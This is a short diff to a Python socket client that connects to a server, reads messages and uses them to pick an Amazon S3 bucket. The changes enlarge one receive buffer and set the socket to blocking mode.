@@ -14,7 +14,7 @@ def command(cmd, msg_in, s):
 		target_bucket = s3.Bucket(msg_in)
 		while True:
 			try:
-				msg_in = s.recv(12).decode('utf-8')
+				msg_in = s.recv(1024).decode('utf-8')
 				break
 			except:
 				pass
@@ -33,7 +33,7 @@ s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect((dst_ip, port))
 msg_in = s.recv(1024).decode('utf-8')
 print(msg_in,end = "")
-s.setblocking(0)
+s.setblocking(1)
 
 while True:
 	while True:
